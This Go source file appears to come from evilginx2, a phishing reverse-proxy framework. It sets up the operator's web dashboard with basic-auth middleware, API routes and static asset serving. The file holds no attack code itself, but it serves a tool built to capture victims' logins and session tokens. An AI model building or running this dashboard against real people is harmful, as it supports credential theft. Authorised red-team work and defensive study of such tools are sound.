package core

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/web"
)

type WebUI struct {
	server *http.Server
	api    *WebAPI
	user   string
	pass   string
}

func NewWebUI(cfg *Config, db *database.Database, p *HttpProxy, crt_db *CertDb, user string, pass string, host string, port int) (*WebUI, error) {
	api := NewWebAPI(cfg, db, p, crt_db)

	r := mux.NewRouter()

	// Basic Auth Middleware
	r.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			u, p, ok := r.BasicAuth()
			if !ok || u != user || p != pass {
				w.Header().Set("WWW-Authenticate", `Basic realm="Restricted"`)
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
				return
			}
			next.ServeHTTP(w, r)
		})
	})

	// API Routes
	apiRouter := r.PathPrefix("/api").Subrouter()
	api.RegisterRoutes(apiRouter)

	// Static Files
	// web.GetWebAssets() returns a FS where "index.html" is at root (because we used * in ../web/fs.go)
	fileServer := http.FileServer(web.GetWebAssets())
	r.PathPrefix("/").Handler(http.StripPrefix("/", fileServer))

	srv := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", host, port),
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      r,
	}

	return &WebUI{
		server: srv,
		api:    api,
		user:   user,
		pass:   pass,
	}, nil
}

func (ui *WebUI) Start() {
	log.Info("Starting Web UI on %s", ui.server.Addr)
	go func() {
		if err := ui.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("Web UI server error: %v", err)
		}
	}()
}

func (ui *WebUI) Stop() {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*5)
	defer cancel()
	ui.server.Shutdown(ctx)
}
